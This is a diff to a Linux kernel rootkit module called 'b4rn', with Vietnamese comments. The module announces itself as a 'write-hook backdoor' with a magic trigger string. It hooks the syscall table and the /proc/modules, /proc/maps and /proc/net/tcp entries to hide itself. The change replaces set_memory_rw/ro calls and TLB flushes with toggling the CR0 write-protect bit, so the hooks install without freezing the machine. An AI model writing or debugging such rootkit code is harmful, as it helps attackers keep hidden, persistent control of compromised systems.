@@ -38,7 +38,6 @@
 #include <linux/types.h>
 #include <linux/uaccess.h>
 #include <asm/special_insns.h>
-#include <asm/tlbflush.h>
 #include <net/tcp.h>
 #include <net/net_namespace.h>
 
@@ -52,8 +51,6 @@ extern unsigned long loops_per_jiffy;
 
 static unsigned long *syscall_table;
 static unsigned long *seq_show_addr;
-static int (*fixed_set_memory_rw)(unsigned long, int);
-static int (*fixed_set_memory_ro)(unsigned long, int);
 static struct file_operations *proc_modules_operations;
 static int (*old_seq_show)(struct seq_file *seq, void *v);
 
@@ -97,31 +94,36 @@ struct linux_dirent64 {
 
 /* =================================================================
  * PHẦN 1: BẢO VỆ BỘ NHỚ
+ * Chỉ dùng CR0 WP bit — an toàn, không gọi set_memory_rw/ro
+ * vì set_memory_* + TLB flush có thể gây freeze trên kernel 4.8 VM.
  * ================================================================= */
 
-static inline void
-tlb_flush_hard(void)
+static inline void disable_wp(void)
 {
-    /* KHÔNG dùng write_cr3: current->mm có thể NULL trong kernel context
-     * => gây kernel panic / VM freeze ngay sau insmod.
-     * __flush_tlb_all() là đủ để invalidate TLB sau khi đổi page protection. */
-    __flush_tlb_all();
+    unsigned long cr0 = read_cr0();
+    write_cr0(cr0 & ~CR0_WP);
 }
 
+static inline void enable_wp(void)
+{
+    unsigned long cr0 = read_cr0();
+    write_cr0(cr0 | CR0_WP);
+}
+
+/* Giữ lại unprotect/protect page để không đổi interface,
+ * nhưng chỉ toggle CR0 — KHÔNG gọi set_memory_* hay flush TLB */
 static inline void
 unprotect_page(unsigned long addr)
 {
-    write_cr0(read_cr0() & (~CR0_WP));
-    fixed_set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 1);
-    tlb_flush_hard();
+    (void)addr;
+    disable_wp();
 }
 
 static inline void
 protect_page(unsigned long addr)
 {
-    write_cr0(read_cr0() | CR0_WP);
-    fixed_set_memory_ro(PAGE_ALIGN(addr) - PAGE_SIZE, 1);
-    tlb_flush_hard();
+    (void)addr;
+    enable_wp();
 }
 
 
@@ -513,22 +515,6 @@ find_syscall_table(void)
  * ================================================================= */
 
 static int
-init_overrides(void)
-{
-    fixed_set_memory_rw = (void *)kallsyms_lookup_name("set_memory_rw");
-    if (!fixed_set_memory_rw) {
-        printk(KERN_ERR "[b4rn] Cannot find set_memory_rw\n");
-        return -1;
-    }
-    fixed_set_memory_ro = (void *)kallsyms_lookup_name("set_memory_ro");
-    if (!fixed_set_memory_ro) {
-        printk(KERN_ERR "[b4rn] Cannot find set_memory_ro\n");
-        return -1;
-    }
-    return 0;
-}
-
-static int
 init_syscall_tab(void)
 {
     syscall_table = (unsigned long *)find_syscall_table();
@@ -588,7 +574,6 @@ b4rn_init(void)
     printk(KERN_INFO "[b4rn] Loading v1.0 (write-hook backdoor)\n");
     printk(KERN_INFO "[b4rn] Magic: echo \"%s\"\n", BACKDOOR_MAGIC);
 
-    if (init_overrides())   return -1;
     if (init_proc_mods())   return -1;
     if (init_proc_maps())   return -1;
     if (init_proc_net_tcp_hook()) return -1;
